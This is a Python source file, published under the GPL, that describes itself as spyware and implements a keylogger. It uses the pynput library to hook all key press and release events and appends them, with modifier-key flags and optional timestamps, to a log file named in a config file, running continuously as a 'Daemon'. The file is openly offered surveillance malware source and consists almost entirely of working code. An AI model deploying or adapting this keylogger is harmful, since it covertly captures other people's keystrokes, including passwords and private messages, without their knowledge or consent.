#!/usr/bin/env python3
# -*- coding: utf-8 -*-

""" This package implement a spyware to get keyboard event. """

###################
#    This package implement a spyware to get keyboard event.
#    Copyright (C) 2021  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

__all__ = ["Daemon", "KeyLogger", "main", "config_load"]

from pynput.keyboard import Key, Listener, Controller, KeyCode
from time import localtime, strftime, struct_time
from configparser import ConfigParser
from os import path, environ
from enum import Enum
from sys import argv


def config_load() -> None:

    """ This function load the config file. """

    global Constantes
    
    CONFIG = ConfigParser()
    env_conf_file = environ.get("keySpy.conf")

    if len(argv) == 2:
        CONFIG.read(argv[1])
    elif env_conf_file:
        CONFIG.read(env_conf_file)
    else:
        CONFIG.read(path.join(path.dirname(__file__), "keySpy.conf"))


    class Constantes(Enum):

        save_filename: str = CONFIG["SAVE"]["filename"]
        write_eventPress: int = CONFIG.getint("SAVE", "event_press")
        write_eventRelease: int = CONFIG.getint("SAVE", "event_release")
        write_hotKeys: int = CONFIG.getint("SAVE", "hot_keys")
        write_eventTime: int = CONFIG.getint("SAVE", "event_time")


class KeyLogger:

    """ This class implement a keylogger. """

    def __init__(self):
        self.is_pressed: list = []
        self.file: str = Constantes.save_filename.value
        self.controller: Controller = Controller()
        self.run = True

    def get_event_press(self, event: Key) -> None:

        """ This method add a key press event. """

        key: str = self.get_event_char(event)

        if Constantes.write_hotKeys.value:
            for event in self.is_pressed:
                key = f"{event} <{key}>"

        if Constantes.write_eventPress.value:
            key += "PRESS: " + key

        if self.controller.shift_pressed:
            key += " (MAJ)"
        if self.controller.alt_pressed:
            key += " (ALT)"
        if self.controller.alt_gr_pressed:
            key += " (ALTGR)"
        if self.controller.ctrl_pressed:
            key += " (CTRL)"

        self.is_pressed.append(event)

        self.save(key + "\n")
        return self.run

    def get_code(self, event) -> int:

        """ This function return the code of Key or KeyCode. """

        if type(event) == KeyCode:
            code = event.vk
        elif type(event) == Key:
            code = event._value_.vk

        return code

    def get_event_release(self, event: Key) -> None:

        """ This method add a key release event. """

        if Constantes.write_eventRelease.value:
            self.save("RELEASE: " + self.get_event_char(event) + "\n")

        code = self.get_code(event)

        if len(self.is_pressed):
            self.is_pressed.pop()

        return self.run

    def run_for_ever(self) -> None:

        """ Start the keylogger. """

        with Listener(
            on_press=self.get_event_press, on_release=self.get_event_release
        ) as listener:
            listener.join()

    def save(self, key: str) -> None:

        """ This method save pressed keys in file and clean the events list. """

        if Constantes.write_eventTime.value:
            text = strftime(f"%Y-%m-%d %H:%M:%S -> {key}")
        else:
            text = key

        with open(self.file, "a") as file:
            file.write(text)

    def get_event_char(self, event: Key) -> str:

        """ This function get event.char if exist. """

        char: str = event.__dict__.get("char")

        if char is None:
            char: str = str(event)

        return char


def main() -> None:
    config_load()

    daemon = Daemon()

    try:
        daemon.run_for_ever()
    except KeyboardInterrupt:
        daemon.run = False


Daemon = KeyLogger

if __name__ == "__main__":
    main()
